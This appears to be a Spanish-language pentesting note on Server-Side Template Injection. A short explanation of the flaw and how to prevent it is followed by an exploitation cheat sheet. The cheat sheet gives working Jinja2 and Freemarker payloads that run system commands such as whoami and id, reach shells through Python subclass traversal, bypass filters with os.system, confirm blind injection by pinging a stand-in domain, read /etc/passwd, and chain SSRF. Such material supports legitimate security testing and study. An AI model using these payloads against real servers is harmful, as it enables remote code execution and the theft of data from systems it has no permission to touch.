-- - 
# Descripcion 
El Server-Side Template Injection (SSTI) es una vulnerabilidad de seguridad en la que un atacante puede inyectar código malicioso en una plantilla de servidor.

Las plantillas de servidor son archivos que contienen código que se utiliza para generar contenido dinámico en una aplicación web. Los atacantes pueden aprovechar una vulnerabilidad de SSTI para inyectar código malicioso en una plantilla de servidor, lo que les permite ejecutar comandos en el servidor y obtener acceso no autorizado tanto a la aplicación web como a posibles datos sensibles.

Por ejemplo, imagina que una aplicación web utiliza plantillas de servidor para generar correos electrónicos personalizados. Un atacante podría aprovechar una vulnerabilidad de SSTI para inyectar código malicioso en la plantilla de correo electrónico, lo que permitiría al atacante ejecutar comandos en el servidor y obtener acceso no autorizado a los datos sensibles de la aplicación web.

En un caso práctico, los atacantes pueden detectar si una aplicación Flask está en uso, por ejemplo, utilizando herramientas como WhatWeb. Si un atacante detecta que una aplicación Flask está en uso, puede intentar explotar una vulnerabilidad de SSTI, ya que Flask utiliza el motor de plantillas Jinja2, que es vulnerable a este tipo de ataque.

Para los atacantes, detectar una aplicación Flask o Python puede ser un primer paso en el proceso de intentar explotar una vulnerabilidad de SSTI. Sin embargo, los atacantes también pueden intentar identificar vulnerabilidades de SSTI en otras aplicaciones web que utilicen diferentes frameworks de plantillas, como Django, Ruby on Rails, entre otros.

Para prevenir los ataques de SSTI, los desarrolladores de aplicaciones web deben validar y filtrar adecuadamente la entrada del usuario y utilizar herramientas y frameworks de plantillas seguros que implementen medidas de seguridad para prevenir la inyección de código malicioso.
-- - 
## 📝 **Server-Side Template Injection (SSTI) Cheat Sheet**

**Siempre que vemos que esta corriendo python de fondo, flask o werkzeug hay que probar el siguiente payload:**
```flask
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }} --> payload usado para ejecutar comandos.
```
#### 🔧 **Payload Crafting**

- **Jinja2**: 
  - **Acceder a objetos de Python si el sandbox es débil**:
    ```jinja2
    {{''.__class__.__mro__[1].__subclasses__()[X]}}
    ```
    - Reemplaza `X` con un índice (por ejemplo, `135` para `os._wrap_close`) para generar shells.

- **Freemarker**: 
  - **Invocar utilidades de Java**:
    ```freemarker
    <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
    ```
  
---
#### 🚀 **Bypass Tactics**

- **¿Sandboxed?** 
  - Busca configuraciones incorrectas o versiones antiguas (por ejemplo, **Jinja2 < 2.10** tenía bypasses).
- **¿Filtros activos?**
  - Utiliza cadenas con pipes:
    ```jinja2
    {{'id'|os.system}}
    ```
  
---
#### 💡 **Explotación Avanzada**

- **Blind SSTI (sin salida visible)**:
  - Genera retrasos o pings para confirmar la ejecución:
    ```jinja2
    {{().__class__.__bases__[0].__subclasses__()[X]('ping -c 10 yourdomain.com')}}
    ```

- **Inclusión de Archivos (File Inclusion)**:
  - Leer archivos secretos:
    ```freemarker
    <#include "/etc/passwd">
    ```

- **SSRF Chaining (Encadenamiento de SSRF)**:
  - Pivote interno:
    ```jinja2
    {{url_for('http://internal.service')}}
    ```
  
---

¡Pega este resumen directamente en Obsidian y tendrás una referencia rápida para técnicas de explotación SSTI! 💥

| Template Engine | Test Payload        | Success Indicator |
| --------------- | ------------------- | ----------------- |
| Jinja2          | {{7*7}}             | 49 in response    |
| Freemarker      | <#assign x=7*7>${x} | 49 in response    |
| Twig            | {{7*7}}             | 49 in response    |
| Velocity        | #set($x=7*7)$x      | 49 in response    |


### Resources
https://github.com/swisskyrepo/PayloadsAllTheThings
**tplmap:** Scans for SSTI across engines:
